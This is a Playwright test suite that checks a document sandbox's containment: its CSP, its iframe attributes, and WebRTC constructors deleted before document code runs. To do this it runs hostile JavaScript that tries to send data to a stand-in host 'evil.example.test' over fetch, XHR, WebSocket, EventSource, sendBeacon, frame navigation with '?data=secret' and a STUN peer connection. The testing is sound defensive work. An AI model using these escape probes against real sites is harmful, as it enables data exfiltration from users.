import { readFileSync } from 'node:fs';
import path from 'node:path';
import { expect, expectConsoleErrors, test } from '../fixtures.js';
import { requireEnv } from '../helpers/env.js';
import {
  DOCUMENT_IFRAME_SANDBOX_ATTR,
  DocumentSandboxHarness,
  sandboxOriginUrl,
} from '../helpers/sandbox-harness.js';

/**
 * Runtime confirmation that untrusted document code cannot escape the sandbox
 * origin. Each case runs a hostile document inside the real renderer served
 * under its real Content-Security-Policy and proves the escape is contained.
 * These are the alarm on the containment wall: an edit that weakens the sandbox
 * CSP or the iframe attributes makes a case here go red before review.
 *
 * The whole corpus is Chromium-only. The containment mechanisms (CSP directive
 * enforcement, sandbox-attribute semantics) and the console prose these tests
 * key on are engine-specific; Chromium is also the engine the plan designated
 * for confirming these properties. WebKit/Firefox coverage of the same
 * properties is not attempted here (and iOS WKWebView is out of automated reach
 * entirely — noted per case where the residual matters).
 *
 * The parent page is a synthetic cross-origin embedder (see the harness), so
 * the corpus isolates pure containment from the chat flow. An independent
 * backstop rides along on every case: the suite's network allowlist aborts and
 * fails on any request to a non-allowlisted host, so a real escape fails the
 * test even if its own assertion somehow passed.
 */

/** A host that is deliberately absent from both the sandbox CSP and the suite allowlist. */
const OFF_ALLOWLIST_HTTPS = 'https://evil.example.test';
const OFF_ALLOWLIST_WSS = 'wss://evil.example.test/socket';

/**
 * Console prose the corpus intentionally provokes: CSP refusals and sandbox
 * restriction notices. Opting these out is justified here precisely because
 * provoking them is the point — every pattern names a security block the test
 * asserts, so it can only mask the violations under test, not app defects.
 */
const EXPECTED_SECURITY_CONSOLE: RegExp[] = [
  /Content Security Policy/i,
  /Refused to (connect|frame|display|run)/i,
  /sandbox/i,
  /allow-(popups|top-navigation|modals|same-origin)/i,
  /Ignored call to/i,
  /was blocked/i,
  /Blocked (opening|a frame|script)/i,
  /Unsafe attempt to initiate navigation/i,
];

/** Reports every CSP violation the running document sees, so a connect-src block is observable. */
const CSP_VIOLATION_REPORTER =
  "document.addEventListener('securitypolicyviolation',function(e){console.log('CSPV '+e.violatedDirective+' '+e.blockedURI)});";

test.describe('document sandbox containment', { tag: '@chromium-only' }, () => {
  test('runtime network egress to an off-allowlist host is blocked on every channel', async ({
    unauthenticatedPage,
  }) => {
    expectConsoleErrors(unauthenticatedPage, EXPECTED_SECURITY_CONSOLE);
    const harness = await new DocumentSandboxHarness(unauthenticatedPage).open();

    // fetch, XMLHttpRequest, WebSocket, EventSource, and sendBeacon each aim at
    // the off-allowlist host. connect-src 'self' + wheel hosts must block all of
    // them; each channel self-reports BLOCKED, and sendBeacon (whose queued
    // return value cannot reveal the block) is proven by the connect-src CSP
    // violation the reporter surfaces.
    const code = [
      CSP_VIOLATION_REPORTER,
      `fetch(${JSON.stringify(OFF_ALLOWLIST_HTTPS + '/fetch')}).then(function(){console.log('LEAK:fetch')}).catch(function(){console.log('BLOCKED:fetch')});`,
      `try{var x=new XMLHttpRequest();x.open('GET',${JSON.stringify(OFF_ALLOWLIST_HTTPS + '/xhr')});x.onload=function(){console.log('LEAK:xhr')};x.onerror=function(){console.log('BLOCKED:xhr')};x.send();}catch(e){console.log('BLOCKED:xhr '+e.name)}`,
      `try{var w=new WebSocket(${JSON.stringify(OFF_ALLOWLIST_WSS)});w.onopen=function(){console.log('LEAK:ws')};w.onerror=function(){console.log('BLOCKED:ws')};}catch(e){console.log('BLOCKED:ws '+e.name)}`,
      `try{var s=new EventSource(${JSON.stringify(OFF_ALLOWLIST_HTTPS + '/sse')});s.onopen=function(){console.log('LEAK:es')};s.onerror=function(){console.log('BLOCKED:es');s.close();};}catch(e){console.log('BLOCKED:es '+e.name)}`,
      `navigator.sendBeacon(${JSON.stringify(OFF_ALLOWLIST_HTTPS + '/beacon')},'x');`,
    ].join('\n');
    await harness.sendInit('js', code);

    const log = harness.bridgeLog();
    await expect(log).toContainText('BLOCKED:fetch');
    await expect(log).toContainText('BLOCKED:xhr');
    await expect(log).toContainText('BLOCKED:ws');
    await expect(log).toContainText('BLOCKED:es');
    // The beacon's block is the connect-src CSP violation naming the off-allowlist host.
    await expect(log).toContainText('CSPV connect-src https://evil.example.test/beacon');
  });

  test('the iframe attributes block popups, top-navigation, modals, and reaching the parent', async ({
    unauthenticatedPage,
  }) => {
    expectConsoleErrors(unauthenticatedPage, EXPECTED_SECURITY_CONSOLE);

    // A real modal would surface as a dialog event; an allow-scripts-only frame
    // suppresses window.alert entirely, so none must fire.
    let dialogFired = false;
    unauthenticatedPage.on('dialog', (d) => {
      dialogFired = true;
      void d.dismiss();
    });

    const harness = await new DocumentSandboxHarness(unauthenticatedPage).open();

    const code = [
      // Popup: no allow-popups → window.open returns null.
      `console.log('POPUP:'+(window.open(${JSON.stringify(OFF_ALLOWLIST_HTTPS)},'_blank')===null?'BLOCKED':'LEAK'));`,
      // Top navigation: no allow-top-navigation → assignment throws.
      `try{window.top.location.href=${JSON.stringify(OFF_ALLOWLIST_HTTPS)};console.log('TOPNAV:LEAK');}catch(e){console.log('TOPNAV:BLOCKED '+e.name)}`,
      // Reaching the embedding app: cross-origin, no allow-same-origin → each read throws.
      `try{void window.parent.document;console.log('PARENT_DOM:LEAK');}catch(e){console.log('PARENT_DOM:BLOCKED '+e.name)}`,
      `try{void window.top.location.href;console.log('TOP_LOC:LEAK');}catch(e){console.log('TOP_LOC:BLOCKED '+e.name)}`,
      `try{void window.parent.localStorage;console.log('PARENT_STORAGE:LEAK');}catch(e){console.log('PARENT_STORAGE:BLOCKED '+e.name)}`,
      // Modal: no allow-modals → alert is ignored and returns synchronously.
      `alert('x');console.log('MODAL:RETURNED');`,
    ].join('\n');
    await harness.sendInit('js', code);

    const log = harness.bridgeLog();
    await expect(log).toContainText('POPUP:BLOCKED');
    await expect(log).toContainText('TOPNAV:BLOCKED');
    await expect(log).toContainText('PARENT_DOM:BLOCKED');
    await expect(log).toContainText('TOP_LOC:BLOCKED');
    await expect(log).toContainText('PARENT_STORAGE:BLOCKED');
    // The alert() returned (suppressed, not shown) and no dialog ever surfaced.
    await expect(log).toContainText('MODAL:RETURNED');
    expect(dialogFired).toBe(false);
  });

  // The child self-navigation exfil is governed by the embedder's frame-src.
  // Both delivery mechanisms must contain it: the web `_headers` (an HTTP
  // header) and the Capacitor bundle's `<meta http-equiv>` — the mobile path
  // where `_headers` never reaches. A block is reported to the embedding page,
  // so the harness surfaces it as a parent-side frame-src violation.
  for (const delivery of ['header', 'meta'] as const) {
    test(`a document cannot self-navigate its frame to an off-allowlist host (frame-src via ${delivery})`, async ({
      unauthenticatedPage,
    }) => {
      expectConsoleErrors(unauthenticatedPage, EXPECTED_SECURITY_CONSOLE);
      const harness = await new DocumentSandboxHarness(unauthenticatedPage).open({
        frameSourceDelivery: delivery,
      });

      await harness.sendInit(
        'js',
        `window.location.href=${JSON.stringify(OFF_ALLOWLIST_HTTPS + '/steal?data=secret')};console.log('NAV:attempted');`
      );

      const log = harness.bridgeLog();
      // The parent's frame-src blocked the navigation; the frame never left the
      // sandbox origin (had it navigated, no NAV:attempted would follow, and the
      // network allowlist would have recorded the escape).
      await expect(log).toContainText('CSPV frame-src https://evil.example.test');
      await expect(log).toContainText('NAV:attempted');
    });
  }

  test('a torn-down frame stops executing — no messages or network after teardown', async ({
    unauthenticatedPage,
  }) => {
    expectConsoleErrors(unauthenticatedPage, EXPECTED_SECURITY_CONSOLE);
    const harness = await new DocumentSandboxHarness(unauthenticatedPage).open();

    // The document beacons on an interval; teardown (the app's Stop) removes the
    // frame element, which destroys its execution context. Nothing may run or
    // emit afterwards — no zombie timer, no surviving worker (there are none).
    await harness.sendInit(
      'js',
      "var n=0;setInterval(function(){console.log('BEACON '+(n++))},30);console.log('ARMED');"
    );

    const log = harness.bridgeLog();
    await expect(log).toContainText('ARMED');
    // Confirm it is actively emitting before we kill it.
    await expect(log).toContainText('BEACON 2');

    await harness.teardownFrame();
    // A fresh frame's readiness is a positive real-time fence: a still-alive
    // interval (30 ms) would emit many beacons across the reload round-trip.
    await harness.recreateFrame();
    await harness.waitForReady(2);

    const countBeacons = async (): Promise<number> => {
      const text = (await log.textContent()) ?? '';
      return (text.match(/BEACON /g) ?? []).length;
    };
    const frozenCount = await countBeacons();
    // The count stays frozen across the assertion window — the dead frame emits
    // nothing more. A surviving frame would keep incrementing and never settle.
    await expect.poll(countBeacons).toBe(frozenCount);
  });

  test('the served sandbox CSP and headers match the shipped policy exactly', async ({
    request,
  }) => {
    const sandbox = sandboxOriginUrl();
    const response = await request.get(`${sandbox}/render.html`);
    expect(response.ok()).toBe(true);

    // The sandbox origin is credential-free — it must never issue a cookie. This
    // is the invariant the approved subdomain rests on: a subdomain (rather than a
    // wholly separate domain) is safe only because no credentialed request ever
    // reaches this origin, so a Set-Cookie here would create a cookie jar that
    // could bleed across the app/sandbox boundary and is also what makes the `*`
    // CORS above safe. A future cookie-setting endpoint on this origin must fail here.
    expect(response.headers()['set-cookie']).toBeUndefined();

    const servedCsp = response.headers()['content-security-policy'];
    const servedDnsControl = response.headers()['x-dns-prefetch-control'];

    // The shipped policy is the source of truth (no hardcoded second copy): read
    // it from the deployed `_headers` and require the live origin to serve it
    // byte-for-byte.
    const headersFile = readFileSync(path.resolve('apps/sandbox/public/_headers'), 'utf8');
    const shippedCsp = headersFile
      .split('\n')
      .map((line) => line.trim())
      .find((line) => line.startsWith('Content-Security-Policy:'))
      ?.slice('Content-Security-Policy:'.length)
      .trim();

    expect(shippedCsp).toBeDefined();
    expect(servedCsp).toBe(shippedCsp);
    expect(servedDnsControl).toBe('off');

    // The load-bearing containment directives must be present, so a byte-equal
    // match cannot pass on a policy that quietly dropped one.
    // The floor: anything not enumerated is denied, so an unset fetch directive
    // blocks rather than inheriting a permissive fallback.
    expect(servedCsp).toContain("default-src 'none'");
    expect(servedCsp).toContain(
      "connect-src 'self' https://pypi.org https://files.pythonhosted.org"
    );
    // A fresh realm is the only way to recover the deleted WebRTC constructors;
    // denying child frames, workers, and objects removes it. Kept `webrtc 'block'`
    // is harmless belt-and-braces for any engine that later honors it.
    expect(servedCsp).toContain("frame-src 'none'");
    expect(servedCsp).toContain("child-src 'none'");
    expect(servedCsp).toContain("worker-src 'none'");
    expect(servedCsp).toContain("object-src 'none'");
    expect(servedCsp).toContain("webrtc 'block'");
    // The ported dev/e2e and Android shell origins embed the sandbox — the
    // portless form matched only port 80 and blocked them.
    expect(servedCsp).toContain('frame-ancestors');
    expect(servedCsp).toContain('http://localhost:*');
    // Inline execution is required (the sandbox runs the document's own scripts)
    // and grants no new capability — containment is origin isolation plus the
    // network lockdown above, never script-src.
    expect(servedCsp).toContain("script-src 'self' 'unsafe-inline'");
    // No wildcard egress ever crept in.
    expect(servedCsp).not.toContain('connect-src *');
    expect(servedCsp).not.toContain('*.evil');

    // The iframe attribute the corpus embeds with — and every containment case
    // above proves the runtime effect of — is exactly allow-scripts.
    expect(DOCUMENT_IFRAME_SANDBOX_ATTR).toBe('allow-scripts');
  });

  test('the app origin ships a frame-src CSP naming the sandbox origin', async ({ request }) => {
    const previewUrl = `http://localhost:${requireEnv('HB_PREVIEW_PORT')}`;
    const sandbox = sandboxOriginUrl();
    const response = await request.get(previewUrl);
    expect(response.ok()).toBe(true);
    const indexHtml = await response.text();

    // The app carries frame-src in the served HTML (the `<meta http-equiv>` that
    // also reaches the Capacitor WebView, where `_headers` does not), and it
    // names the sandbox origin — the allowlist a child self-navigation is bound
    // to. Its absence is the mobile exfil hole.
    expect(indexHtml).toMatch(/http-equiv=["']Content-Security-Policy["']/i);
    expect(indexHtml).toContain('frame-src');
    expect(indexHtml).toContain(sandbox);
  });

  // WebRTC is an egress channel the CSP cannot govern: connect-src does not cover
  // RTCPeerConnection, and `webrtc 'block'` is a draft directive Chromium does not
  // enforce (a raw document reaches a public STUN server over UDP despite it). The
  // wall is the bootstrap deleting the WebRTC constructors from the frame global
  // before any document code runs, so the constructor is absent and any
  // construction throws. That throw is what closes the STUN/TURN exfil path: no
  // peer connection is ever built, so no ICE candidate is gathered and no UDP
  // leaves the frame. The deletion is JS-layer, engine-agnostic — it holds on iOS
  // WKWebView too (which ignores the CSP directive entirely); the on-device
  // WKWebView confirmation is a separate manual check, but the mechanism proven
  // here is the same one that runs there.
  test('WebRTC constructors are absent so peer connections cannot be built', async ({
    unauthenticatedPage,
  }) => {
    expectConsoleErrors(unauthenticatedPage, EXPECTED_SECURITY_CONSOLE);
    const harness = await new DocumentSandboxHarness(unauthenticatedPage).open();

    // Attempt to build a peer connection aimed at a public STUN server. The
    // constructor global is deleted, so `new RTCPeerConnection(...)` throws before
    // any candidate can be gathered — no `onicecandidate` handler is ever wired,
    // no STUN request is sent.
    await harness.sendInit(
      'js',
      [
        "console.log('RTC:typeof '+(typeof RTCPeerConnection));",
        "try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});",
        "pc.onicecandidate=function(e){if(e.candidate){console.log('ICE '+e.candidate.type);}else{console.log('ICE done');}};",
        "pc.createDataChannel('x');",
        'pc.createOffer().then(function(o){return pc.setLocalDescription(o)});',
        "console.log('WEBRTC:LEAK');}catch(e){console.log('WEBRTC:BLOCKED '+e.name);}",
      ].join('\n')
    );

    const log = harness.bridgeLog();
    // The constructor is gone and construction threw — the exfil channel is closed.
    await expect(log).toContainText('RTC:typeof undefined');
    await expect(log).toContainText('WEBRTC:BLOCKED');
    // A peer connection was never built, so no ICE candidate of any kind is
    // gathered; a srflx/relay candidate would have proven STUN/TURN egress.
    await expect(log).not.toContainText('WEBRTC:LEAK');
    await expect(log).not.toContainText('ICE srflx');
    await expect(log).not.toContainText('ICE relay');
  });
});
